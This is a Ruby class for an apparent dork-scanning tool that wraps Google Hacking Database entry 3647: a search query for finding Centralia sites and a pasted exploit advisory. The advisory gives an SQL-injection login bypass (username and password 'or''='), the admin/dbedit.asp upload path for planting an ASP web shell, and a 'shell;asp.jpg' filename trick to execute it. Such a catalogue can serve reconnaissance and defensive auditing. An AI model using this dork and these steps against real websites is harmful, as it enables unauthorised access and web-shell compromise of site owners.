module Dorks
   class Dork3647 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3647",
            ghdb_url: "https://www.exploit-db.com/ghdb/3647",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2010-12-14",
            author: "anonymous",
            dork: <<~EDORK,
inurl:showcat.asp?id=
EDORK
            description: <<~EDESC
======================================== Centralia (admin/dbedit.asp?) Bypass and Shell Upload Vulnerability ======================================== ################################################################# # Exploit : Centralia (admin/dbedit.asp?) Bypass and File Upload Vulnerability # Date : 10 December 2010 # Author : ali.erroor # Version : n/a # Googel DorK : inurl:showcat.asp?id= # Home : www.network-security.ir # Email : ali.erroor@att.net ################################################################# [+] Exploit [1] Centralia (admin/dbedit.asp?) Bypass and File Upload Vulnerability.. [-] http://localhost/path/admin/dbedit.asp?table=products [-] username : 'or''=' [-] password : 'or''=' [2] Create New Upload Your Shell.Asp .. [-] http://localhost/path/admin/dbedit.asp?a=upload_init [3] To See Shell Edit Your uploads [-] http://localhost/path/uploads/shell;asp.jpg [+] Demo [-] http://server/admin/dbedit.asp?table=products [-] http://server/admin/dbedit.asp?a=upload_init ################################################################# Great 2 : : h4m1d /sheisebaboo / vc.emliter / H-SK33PY / Net.Editor / HUrr!c4nE / Cair3x /novin security team and all iranian hackers #################################################################
EDESC
         })

      end
   end
end
